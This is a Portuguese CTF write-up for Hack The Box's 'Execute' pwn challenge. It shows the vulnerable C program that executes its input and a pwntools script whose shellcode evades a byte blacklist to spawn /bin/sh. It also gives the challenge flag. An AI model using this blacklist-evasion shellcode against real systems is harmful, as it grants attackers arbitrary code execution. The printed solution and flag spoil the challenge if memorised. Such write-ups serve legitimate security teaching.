# WriteUp: Execute

## Descrição do Desafio:
**Autor**: [AlexZander](https://app.hackthebox.com/users/90864) \
**Plataforma**: [Hack The Box](https://app.hackthebox.com/challenges/Execute) \
**Categoria**: Pwn \
**Dificuldade**: Fácil \
**Data**: 2024 \
**Descrição**:
> Can you feed the hungry code?

## Passo a Passo da Solução
### 1. Análise do arquivo fornecido
Este desafio fornece o código-fonte dele, dessa forma o primeiro passo é analisar ele para tentar identificar possíveis vulnerabilidades.

{% code title="execute.c" overflow="wrap" lineNumbers="true" %}

```c
// gcc execute.c -z execstack -o execute

#include <signal.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>

void setup() {
    setvbuf(stdin,  NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);
    alarm(0x7f);
}

int check(char *a, char *b, int size, int op) {
    for(int i = 0; i < op; i++) {
        for(int j = 0; j < size-1; j++) {
            if(a[i] == b[j])
                return 0;
        }
    }
    
    return 1337;
}

int main(){
    char buf[62];
    char blacklist[] = "\x3b\x54\x62\x69\x6e\x73\x68\xf6\xd2\xc0\x5f\xc9\x66\x6c\x61\x67";

    setup();

    puts("Hey, just because I am hungry doesn't mean I'll execute everything");
    
    int size = read(0, buf, 60);
	   
    if(!check(blacklist, buf, size, strlen(blacklist))) {
        puts("Hehe, told you... won't accept everything");
        exit(1337);
    }

    ( ( void (*) () ) buf) ();
}

```

{% endcode %}

Analisando o código, podemos perceber que ele verifica se nosso *input* contém algum dos *bytes* da `blacklist`, e se nenhum desses *bytes* estiver no *input*, o código executa o que estiver no `buf`.

Dessa forma, a vulnerabilidade se torna bem óbvia, devemos inserir *shellcodes* no *input* para eles imprimirem o conteúdo do arquivo `flag.txt` ou deem acesso ao terminal, porém nenhum dos *bytes* da `blacklist` deve estar no *input*.

### 2. Exploit
A abordagem adotada foi criar um *shellcode* que chama a *syscall* `execve` passando como parâmetro a *string* `/bin/sh`. Normalmente, o assembly seria:

{% code title="normal_assembly" overflow="wrap" lineNumbers="true" %}

```asm

mov rdi, "/bin/sh" ; Na verdade seria o endereço da string.
mov rdx, 0
mov rsi, 0
mov rax, 0x3b
syscall

```

{% endcode %}

Porém muitos dos *bytes* presentes nessa sequência de código estão na `blacklist`. Então, a solução acabou sendo mais na tentativa e erro, testando sequências que não contenham *bytes* da lista negra.

{% code title="solve.py" overflow="wrap" lineNumbers="true" %}

```py
from pwn import *

elf = context.binary = ELF("./execute")
context.arch = "x86-64"

p = remote("ip", porta)
#p = process()

shellcode = asm('''
                mov eax, 0x3c
                dec al
                mov rdx, 0
                mov rsi, 0
                mov rdi, 0x0065722f6d65602f
                mov r10, 0x0003010001040200
                add rdi, r10
                push rdi
                mov rdi, rsp
                syscall
''')

p.sendline(shellcode)
p.interactive()
```

{% endcode %}

Com isso é possível obter acesso ao terminal, e digitando o comando `cat flag.txt` a **flag** aparece.

### Flag
`HTB{wr1t1ng_sh3llc0d3_1s_s0_c00l}`

## Autor da WriteUp
[Membro de Exploitation - HenriUz](https://github.com/HenriUz)